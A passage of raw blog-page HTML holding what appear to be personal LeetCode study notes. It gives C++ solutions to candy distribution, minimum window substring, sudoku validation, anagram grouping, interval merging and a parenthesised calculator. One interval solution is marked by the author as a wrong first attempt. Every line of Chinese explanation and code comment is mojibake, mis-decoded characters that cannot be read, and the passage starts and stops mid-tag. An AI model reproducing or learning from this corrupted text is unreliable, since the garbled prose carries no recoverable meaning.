class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">candy</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; ratings)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// ä¸¤æ¬¡éå†å–æœ€å¤§</span></span><br><span class="line">        <span class="type">int</span> n=ratings.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> sum=<span class="number">0</span>;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">v</span><span class="params">(n)</span></span>;</span><br><span class="line">        v[<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(ratings[i]&gt;ratings[i<span class="number">-1</span>])&#123;</span><br><span class="line">                v[i]=v[i<span class="number">-1</span>]+<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> v[i]=<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=n<span class="number">-2</span>;i&gt;=<span class="number">0</span>;i--)&#123;</span><br><span class="line">            <span class="keyword">if</span>(ratings[i]&gt;ratings[i+<span class="number">1</span>])&#123;</span><br><span class="line">                v[i]=<span class="built_in">max</span>(v[i+<span class="number">1</span>]+<span class="number">1</span>,v[i]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> v[i]=<span class="built_in">max</span>(<span class="number">1</span>,v[i]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> e : v)&#123;</span><br><span class="line">            sum += e;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h1>æ»‘åŠ¨çª—å£</h1><p>æœ€å°å­—ä¸²é—®é¢˜</p><p>â€œinâ€ï¼Œå­˜åœ¨äºè€Œä¸å…³å¿ƒå…·ä½“ä½ç½® =&gt; unordered_map<br>å¦‚æœæ˜¯è‹±æ–‡å­—ç¬¦æˆ–è€…æ•°å­—çš„è¯å®Œå…¨å¯ä»¥ç”¨æ•°ç»„ä¸‹æ ‡åšä¸€ä¸€æ˜ å°„ï¼Œå¿«é€Ÿéšæœºå­˜å–è€Œæ— éœ€hashmap</p><ul class="lvl-0"><li class="lvl-2"><p><strong>128é•¿æ•°ç»„ç›¸å½“äºæ˜¯asciiå­—ç¬¦çš„å“ˆå¸Œè¡¨</strong></p></li><li class="lvl-2"><p>ä¸è¦å¤ªå¤æ‚çš„ç®—æ³•ï¼Œç”¨å¥½åŸºæœ¬çš„æ•°æ®ç»“æ„å°±è¡Œï¼Œè§‰å¾—è¦æ›´å¤šä¿¡æ¯å°±å¼€ç©ºé—´å­˜ä¸è¦æ€•</p></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    unordered_map &lt;<span class="type">char</span>, <span class="type">int</span>&gt; ori, cnt;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">check</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">const</span> <span class="keyword">auto</span> &amp;p: ori) &#123;</span><br><span class="line">            <span class="keyword">if</span> (cnt[p.first] &lt; p.second) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">string <span class="title">minWindow</span><span class="params">(string s, string t)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">const</span> <span class="keyword">auto</span> &amp;c: t) &#123;</span><br><span class="line">            ++ori[c];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> l = <span class="number">0</span>, r = <span class="number">-1</span>;</span><br><span class="line">        <span class="type">int</span> len = INT_MAX, ansL = <span class="number">-1</span>, ansR = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (r &lt; <span class="built_in">int</span>(s.<span class="built_in">size</span>())) &#123;</span><br><span class="line">            <span class="keyword">if</span> (ori.<span class="built_in">find</span>(s[++r]) != ori.<span class="built_in">end</span>()) &#123;</span><br><span class="line">                ++cnt[s[r]];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span> (<span class="built_in">check</span>() &amp;&amp; l &lt;= r) &#123;</span><br><span class="line">                <span class="keyword">if</span> (r - l + <span class="number">1</span> &lt; len) &#123;</span><br><span class="line">                    len = r - l + <span class="number">1</span>;</span><br><span class="line">                    ansL = l;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (ori.<span class="built_in">find</span>(s[l]) != ori.<span class="built_in">end</span>()) &#123;</span><br><span class="line">                    --cnt[s[l]];</span><br><span class="line">                &#125;</span><br><span class="line">                ++l;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ansL == <span class="number">-1</span> ? <span class="built_in">string</span>() : s.<span class="built_in">substr</span>(ansL, len);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h1>çŸ©é˜µ</h1><p>ä¸è¦æ‹…å¿ƒç©ºé—´ï¼Œåªç®¡åŠ å°±è¡Œäº†ï¼Œéå†ä¸€éä¿¡æ¯å…¨è®°ä¸‹æ¥</p><p>æ•°ç‹¬åˆ¤æ–­ï¼Œè¡Œåˆ—å’Œ3*3ã€‚</p><p>è‡ªå·±çš„æ–¹æ³•å†™ä¸€åŠè§‰å¾—å¤ªçƒ‚äº†ï¼Œæ˜¯æš´åŠ›éå†ï¼Œcheck3æ¬¡éå†ä¸‰æ¬¡ã€‚è€Œä¸”å°èŒƒå›´3<em>3è¿˜å†™çš„å¾ˆçƒ‚ã€‚çœ‹åˆ«äººçš„ç®—æ³•åº”è¯¥æ˜¯å‡½æ•°ä¼ å…¥å·¦ä¸Šè§’ä½ç½®ç„¶åå¾ªç¯å¡åœ¨3</em>3é‡Œé¢å°±è¡Œã€‚</p><p>éå†ä¸€éçš„æ–¹æ³•æ˜¯</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isValidSudoku</span><span class="params">(vector&lt;vector&lt;<span class="type">char</span>&gt;&gt;&amp; board)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//ä½¿ç”¨ä½è¿ç®—åŠ é€Ÿ</span></span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">rows</span><span class="params">(<span class="number">9</span>)</span></span>;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">cols</span><span class="params">(<span class="number">9</span>)</span></span>;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">block</span><span class="params">(<span class="number">9</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">9</span>;++i)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;<span class="number">9</span>;++j)&#123;</span><br><span class="line">                <span class="keyword">if</span>(board[i][j]==<span class="string">&#x27;.&#x27;</span>)<span class="keyword">continue</span>;</span><br><span class="line">                <span class="type">int</span> x = board[i][j]-<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">                <span class="keyword">if</span>(rows[i]&gt;&gt;x&amp;<span class="number">1</span> || cols[j]&gt;&gt;x&amp;<span class="number">1</span> || block[(i/<span class="number">3</span>)*<span class="number">3</span>+j/<span class="number">3</span>]&gt;&gt;x&amp;<span class="number">1</span>)&#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//åŠ å…¥</span></span><br><span class="line">                rows[i] |= <span class="number">1</span>&lt;&lt;x;</span><br><span class="line">                cols[j] |= <span class="number">1</span>&lt;&lt;x;</span><br><span class="line">                block[(i/<span class="number">3</span>)*<span class="number">3</span>+j/<span class="number">3</span>] |= <span class="number">1</span>&lt;&lt;x; <span class="comment">//(i,j)ä½äºç¬¬(i/3)*3+j/3ä¸ªä¹å®«æ ¼</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>æœ¬è´¨æ˜¯äºŒç»´æ•°ç»„ï¼Œè¿™é‡Œä¸ºäº†åŠ é€Ÿä¼˜åŒ–æˆäº†bitmapçš„æ„Ÿè§‰ï¼Œæ¯ä¸€ä½æ ‡è®°å¯¹åº”æ•°å­—æ˜¯å¦å‡ºç°è¿‡ã€‚</p><h1>å“ˆå¸Œè¡¨</h1><p>ç»Ÿè®¡å¼‚ä½è¯ï¼ŒåŠå­—æ¯ä¸€è‡´é¡ºåºä¸åŒçš„å•è¯ï¼Œé‡æ–°è¾“å‡ºé“¾è¡¨ã€‚å…ˆçœ‹æ ‡ç­”1ã€‚æ ‡ç­”ä¸»è¦æ˜¯ç¡®å®šç”¨å“ˆå¸Œè¡¨ä¹‹åï¼Œè€ƒè™‘ç”¨ä»€ä¹ˆåšå“ˆå¸Œè¡¨çš„é”®ã€‚</p><p>æˆ–è€…è¯´ï¼Œæ ‡ç­”å¼€å§‹å°±è®¤ä¸ºæˆ‘ä»¬åº”å½“ç”¨æŸä¸ªç‰¹å¾å»å½’ç±»é¡ºåºä¸åŒä½†å­—æ¯ä¸€è‡´çš„å•è¯ï¼Œç„¶åç”¨å“ˆå¸Œè¡¨å¤„ç†ï¼Œç”¨ç»Ÿä¸€åŒ–çš„ç‰¹å¾ä½œä¸ºkeyï¼ŒæŒ‰ç…§è¿™ä¸ªç»Ÿä¸€è¿‡çš„keyç›´æ¥å¡è¿›å“ˆå¸Œè¡¨</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;string&gt;&gt; <span class="built_in">groupAnagrams</span>(vector&lt;string&gt;&amp; strs) &#123;</span><br><span class="line">        unordered_map&lt;string, vector&lt;string&gt;&gt; mp;</span><br><span class="line">        <span class="keyword">for</span> (string&amp; str: strs) &#123;</span><br><span class="line">            string key = str;</span><br><span class="line">            <span class="built_in">sort</span>(key.<span class="built_in">begin</span>(), key.<span class="built_in">end</span>());</span><br><span class="line">            mp[key].<span class="built_in">emplace_back</span>(str);</span><br><span class="line">        &#125;</span><br><span class="line">        vector&lt;vector&lt;string&gt;&gt; ans;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> it = mp.<span class="built_in">begin</span>(); it != mp.<span class="built_in">end</span>(); ++it) &#123;</span><br><span class="line">            ans.<span class="built_in">emplace_back</span>(it-&gt;second);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>æˆ‘ä¹Ÿæœ‰ä¸ªæ€è·¯ï¼Œä¸è¿‡æ˜¯è‡ªå·±å®ç°çš„æ›´å¿«çš„å“ˆå¸Œè¡¨ã€‚ç”¨bitmapç»Ÿè®¡å­—æ¯å‡ºç°ä¸å¦ï¼Œä¹Ÿå°±æ˜¯æ•´æ•°+ä½è¿ç®—è®°å½•æ˜¯å¦å­˜åœ¨ã€‚ä½†æ˜¯æµ‹ä¾‹è¿‡ä¸äº†ï¼Œå‘ç°æ˜¯éœ€è¦ç»Ÿè®¡å­—æ¯æ•°é‡ï¼ŒåŒæ ·çš„å­—æ¯ç»„åˆæ•°é‡ä¸åŒbitmapæ²¡æ³•è¡¨ç¤ºï¼Œè¿˜æ˜¯æ’åºæˆ–è€…ç”¨26é¡¹æ•°ç»„æ¥åšã€‚</p><h1>åŒºé—´</h1><p>åˆå¹¶åŒºé—´ã€‚è‡ªå·±çš„ä¸å¯¹çš„ç®—æ³•ã€‚å³ç«¯ç‚¹æ’åºä¸èƒ½ä¿è¯å¯åˆå¹¶åŒºé—´ç›¸é‚»ï¼Œå¯¹äºæ¯ä¸€ä¸ªåŒºé—´éƒ½éœ€è¦è€ƒå¯Ÿå‰©ä¸‹çš„æ‰€æœ‰åŒºé—´ï¼Œæ‰€ä»¥æ˜¯O(n^2)ç®—æ³•ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">static</span> <span class="type">bool</span> <span class="title">cmp</span><span class="params">(<span class="type">const</span> vector&lt;<span class="type">int</span>&gt;&amp; a,<span class="type">const</span> vector&lt;<span class="type">int</span>&gt;&amp; b)</span></span>&#123;</span><br><span class="line">        <span class="comment">// ç®—æ³•è¯¾è®²è¿‡çš„è´ªå¿ƒï¼Ÿå…ˆè¦å¯¹åŒºé—´æ’åºç„¶åéå†å§ï¼Ÿ</span></span><br><span class="line">        <span class="keyword">return</span> a[<span class="number">1</span>]&lt;b[<span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">merge</span>(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; intervals) &#123;</span><br><span class="line">        <span class="comment">// å¯¹äºä»»æ„çš„A,Bä¸¤ä¸ªåŒºé—´ï¼Œæœ‰å¦‚ä¸‹è§„åˆ™ï¼š</span></span><br><span class="line">        <span class="comment">// å¦‚æœAçš„å³ç«¯ç‚¹å±äºBåŒºé—´ï¼Œé‚£ä¹ˆå°±å°†äºŒè€…åˆå¹¶ä¸º[min(lefta,leftb),rightb]</span></span><br><span class="line">        <span class="type">int</span> n=intervals.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="type">bool</span>&gt; <span class="title">if_combine</span><span class="params">(n,<span class="literal">false</span>)</span></span>;</span><br><span class="line">        <span class="comment">// ä¼˜å…ˆæ’åº Ologn</span></span><br><span class="line">        <span class="built_in">sort</span>(intervals.<span class="built_in">begin</span>(),intervals.<span class="built_in">end</span>(),cmp);</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; result;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> k=<span class="number">0</span>;k&lt;n;k++)&#123;</span><br><span class="line">            <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">tmp</span><span class="params">(<span class="number">2</span>)</span></span>;</span><br><span class="line">            tmp=intervals[k];</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i=k+<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(i==n) i--;</span><br><span class="line">                <span class="keyword">if</span>(if_combine[i]) <span class="keyword">continue</span>;</span><br><span class="line">                <span class="keyword">if</span>(tmp[<span class="number">1</span>]&gt;=intervals[i][<span class="number">0</span>])&#123;</span><br><span class="line">                    tmp[<span class="number">0</span>]=<span class="built_in">min</span>(tmp[<span class="number">0</span>],intervals[i][<span class="number">0</span>]);</span><br><span class="line">                    tmp[<span class="number">1</span>]=intervals[i][<span class="number">1</span>];</span><br><span class="line">                    <span class="comment">// è¯¥åŒºé—´å·²ç»è¢«æˆ‘ä»¬åˆå¹¶</span></span><br><span class="line">                    if_combine[i]=<span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(!if_combine[k]) result.<span class="built_in">push_back</span>(tmp);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>è´ªå¿ƒå¯¹äº†ï¼Œä¸è¿‡å·¦ç«¯ç‚¹æ’åºçš„æ€§è´¨æ›´å¥½ï¼šå¯åˆå¹¶åŒºé—´å¿…å®šè¿ç»­</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">merge</span>(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; intervals) &#123;</span><br><span class="line">        <span class="keyword">if</span> (intervals.<span class="built_in">size</span>() == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> &#123;&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">sort</span>(intervals.<span class="built_in">begin</span>(), intervals.<span class="built_in">end</span>());</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; merged;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; intervals.<span class="built_in">size</span>(); ++i) &#123;</span><br><span class="line">            <span class="type">int</span> L = intervals[i][<span class="number">0</span>], R = intervals[i][<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">if</span> (!merged.<span class="built_in">size</span>() || merged.<span class="built_in">back</span>()[<span class="number">1</span>] &lt; L) &#123;</span><br><span class="line">                merged.<span class="built_in">push_back</span>(&#123;L, R&#125;);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                merged.<span class="built_in">back</span>()[<span class="number">1</span>] = <span class="built_in">max</span>(merged.<span class="built_in">back</span>()[<span class="number">1</span>], R);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> merged;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h1>æ ˆ</h1><p>åŠ å‡æ³•æ‹¬å·è®¡ç®—å™¨ã€‚å®˜è§£ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">calculate</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        stack&lt;<span class="type">int</span>&gt; ops;</span><br><span class="line">        ops.<span class="built_in">push</span>(<span class="number">1</span>);</span><br><span class="line">        <span class="type">int</span> sign = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> ret = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> n = s.<span class="built_in">length</span>();</span><br><span class="line">        <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (i &lt; n) &#123;</span><br><span class="line">            <span class="keyword">if</span> (s[i] == <span class="string">&#x27; &#x27;</span>) &#123;</span><br><span class="line">                i++;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (s[i] == <span class="string">&#x27;+&#x27;</span>) &#123;</span><br><span class="line">                sign = ops.<span class="built_in">top</span>();</span><br><span class="line">                i++;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (s[i] == <span class="string">&#x27;-&#x27;</span>) &#123;</span><br><span class="line">                sign = -ops.<span class="built_in">top</span>();</span><br><span class="line">                i++;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (s[i] == <span class="string">&#x27;(&#x27;</span>) &#123;</span><br><span class="line">                ops.<span class="built_in">push</span>(sign);</span><br><span class="line">                i++;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (s[i] == <span class="string">&#x27;)&#x27;</span>) &#123;</span><br><span class="line">                ops.<span class="built_in">pop</span>();</span><br><span class="line">                i++;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="type">long</span> num = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">while</span> (i &lt; n &amp;&amp; s[i] &gt;= <span class="string">&#x27;0&#x27;</span> &amp;&amp; s[i] &lt;= <span class="string">&#x27;9&#x27;</span>) &#123;</span><br><span class="line">                    num = num * <span class="number">10</span> + s[i] - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">                    i++;</span><br><span class="line">                &#125;</span><br><span class="line">                ret += sign * num;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>æˆ‘è‡ªå·±å†™çš„æ²¡æ³•å¤„ç†å•ç›®è¿ç®—ç¬¦è´Ÿå·ï¼Œæƒ³çš„æ˜¯LRè§„çº¦é‚£ç§æ„Ÿè§‰ã€‚å•ç›®è¿ç®—ç¬¦Â±çš„å¥½çš„å¤„ç†åŠæ³•å°±æ˜¯å®˜è§£é‚£ç§ï¼Œæ— è®ºå¦‚ä½•æœ€åéƒ½æ˜¯åŠ ï¼Œç¬¦å·æ ˆé‡Œæ”¾çš„æ˜¯ä¸€ä¸ªç¬¦å·ä½ï¼Œè¯»åˆ°å°±è®¾ç½®ï¼Œå¹¶ä¸”æ¯ä¸ªæ‹¬å·é‡æ–°pushç¬¦å·ä½ã€‚</p><p>æˆ‘è‡ªå·±å†™çš„åœ¨è¿™ä¸ªæµ‹è¯•ä¾‹å­æŒ‚äº†ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1-(   -2)</span><br></pre></td></tr></table></figure><p>æˆ‘çš„æ–¹æ³•æ˜¯åœ¨æ•°å­—æ ˆå¼€å§‹å‹å…¥ä¸€ä¸ª0åé¢çš„ä¸åŠ¨ï¼Œä½†æ˜¯å¯¹æ¯ä¸ªæ‹¬å·éƒ½å‹å…¥0è‚¯å®šä¼šå½±å“è®¡ç®—çš„ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">enum</span> <span class="title 